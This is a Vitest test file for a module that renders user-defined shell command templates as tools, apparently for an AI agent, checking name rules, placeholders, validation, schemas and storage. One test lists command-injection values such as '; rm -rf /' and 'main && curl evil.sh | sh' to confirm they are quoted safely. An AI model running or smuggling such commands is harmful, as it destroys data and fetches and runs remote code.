import { describe, expect, it } from "vitest";
import {
  type CustomTool,
  describeCustomTool,
  formatToolsFile,
  isCustomTool,
  isValidToolName,
  parseToolsFile,
  renderCommand,
  slugifyToolName,
  templatePlaceholders,
  toolInputSchema,
  upsertTool,
  validateTool,
} from "./customTools";

function tool(over: Partial<CustomTool> = {}): CustomTool {
  return {
    name: "deploy",
    description: "Deploy a branch",
    parameters: [{ name: "branch", description: "Branch to deploy" }],
    command: "./deploy.sh {{branch}}",
    ...over,
  };
}

describe("names", () => {
  it("accepts identifiers and rejects anything else", () => {
    expect(isValidToolName("deploy_app")).toBe(true);
    for (const n of ["Deploy", "deploy-app", "1deploy", "", "a b", "../x"]) {
      expect(isValidToolName(n)).toBe(false);
    }
  });

  it("slugifies a prose name rather than refusing it", () => {
    expect(slugifyToolName("Deploy App!")).toBe("deploy_app");
    expect(slugifyToolName("!!!")).toBeNull();
  });

  it("marks its tools apart from the built-ins", () => {
    expect(isCustomTool("cmd__deploy")).toBe(true);
    expect(isCustomTool("bash_run")).toBe(false);
  });
});

describe("templatePlaceholders", () => {
  it("finds each placeholder once, in order", () => {
    expect(templatePlaceholders("a {{x}} b {{y}} c {{x}}")).toEqual(["x", "y"]);
  });

  it("tolerates whitespace inside the braces", () => {
    expect(templatePlaceholders("{{ branch }}")).toEqual(["branch"]);
  });

  it("finds none in a fixed command", () => {
    expect(templatePlaceholders("pnpm test")).toEqual([]);
  });
});

describe("validateTool", () => {
  it("accepts a well-formed tool", () => {
    expect(validateTool(tool())).toEqual({ ok: true });
  });

  // A template using an undeclared placeholder would run with the literal
  // text `{{branch}}` in the command: silently wrong, not a failure.
  it("rejects a placeholder with no parameter behind it", () => {
    const bad = tool({ parameters: [], command: "./deploy.sh {{branch}}" });
    const out = validateTool(bad);
    expect(out.ok).toBe(false);
    expect(out.ok === false && out.reason).toContain("{{branch}}");
  });

  it("rejects a parameter the command never uses", () => {
    const bad = tool({
      parameters: [
        { name: "branch", description: "b" },
        { name: "unused", description: "u" },
      ],
    });
    expect(validateTool(bad).ok).toBe(false);
  });

  it("requires a description and a command", () => {
    expect(validateTool(tool({ description: "  " })).ok).toBe(false);
    expect(validateTool(tool({ command: "", parameters: [] })).ok).toBe(false);
  });
});

describe("renderCommand", () => {
  it("substitutes a value", () => {
    const out = renderCommand(tool(), { branch: "main" });
    expect(out).toEqual({ ok: true, command: "./deploy.sh 'main'" });
  });

  // This is the entire security story: the template is written once, the
  // values vary and are never trusted.
  it("quotes a value that would otherwise be a second command", () => {
    for (const attack of [
      "; rm -rf /",
      "$(whoami)",
      "`id`",
      "main && curl evil.sh | sh",
      "--force; shutdown",
    ]) {
      const out = renderCommand(tool(), { branch: attack });
      expect(out.ok).toBe(true);
      if (!out.ok) continue;
      // The dangerous text survives, quoted, as one argument.
      expect(out.command.startsWith("./deploy.sh '")).toBe(true);
      expect(out.command.endsWith("'")).toBe(true);
    }
  });

  it("has no way to interpolate a value unquoted", () => {
    const out = renderCommand(
      tool({
        parameters: [{ name: "flags", description: "f" }],
        command: "run {{flags}}",
      }),
      { flags: "-a -b" },
    );
    // Even something meant as two flags becomes one argument. Deliberate: the
    // alternative is a raw mode, which puts every tool's safety in the hands
    // of whoever wrote the template.
    expect(out.ok === true && out.command).toBe("run '-a -b'");
  });

  it("refuses when a required parameter is missing", () => {
    const out = renderCommand(tool(), {});
    expect(out.ok).toBe(false);
    expect(out.ok === false && out.reason).toContain("branch");
  });

  it("allows an optional parameter to be absent", () => {
    const t = tool({
      parameters: [{ name: "branch", description: "b", required: false }],
    });
    expect(renderCommand(t, {})).toEqual({ ok: true, command: "./deploy.sh ''" });
  });

  it("substitutes every occurrence", () => {
    const t = tool({ command: "echo {{branch}} {{branch}}" });
    expect(renderCommand(t, { branch: "x" })).toEqual({
      ok: true,
      command: "echo 'x' 'x'",
    });
  });
});

describe("toolInputSchema", () => {
  it("describes the parameters for the model", () => {
    expect(toolInputSchema(tool())).toEqual({
      type: "object",
      properties: { branch: { type: "string", description: "Branch to deploy" } },
      required: ["branch"],
      additionalProperties: false,
    });
  });

  it("omits required entirely when nothing is required", () => {
    const t = tool({
      parameters: [{ name: "branch", description: "b", required: false }],
    });
    expect(toolInputSchema(t)).not.toHaveProperty("required");
  });
});

describe("describeCustomTool", () => {
  // The model should be able to see what it is about to run.
  it("shows the template", () => {
    expect(describeCustomTool(tool())).toContain("./deploy.sh {{branch}}");
  });
});

describe("the store", () => {
  // Parsing makes `required` explicit rather than leaving it implied, so a
  // definition read back says plainly what it expects.
  it("round-trips, normalising required to an explicit flag", () => {
    expect(parseToolsFile(formatToolsFile([tool()]))).toEqual([
      tool({ parameters: [{ name: "branch", description: "Branch to deploy", required: true }] }),
    ]);
  });

  it("reads a bare array as well as a wrapped one", () => {
    expect(parseToolsFile(JSON.stringify([tool()]))).toHaveLength(1);
  });

  // A tool that cannot run correctly is worse in the list than absent from it.
  it("skips a broken definition instead of offering it", () => {
    const content = JSON.stringify({
      tools: [tool(), { name: "bad", description: "d", command: "x {{missing}}" }],
    });
    expect(parseToolsFile(content).map((t) => t.name)).toEqual(["deploy"]);
  });

  it("survives a corrupt file", () => {
    expect(parseToolsFile("not json")).toEqual([]);
    expect(parseToolsFile("{}")).toEqual([]);
  });

  it("replaces a tool of the same name rather than duplicating it", () => {
    const updated = tool({ description: "Deploy a branch, faster" });
    const out = upsertTool([tool()], updated);
    expect(out).toHaveLength(1);
    expect(out[0].description).toBe("Deploy a branch, faster");
  });

  it("appends a new one", () => {
    expect(upsertTool([tool()], tool({ name: "other" }))).toHaveLength(2);
  });
});
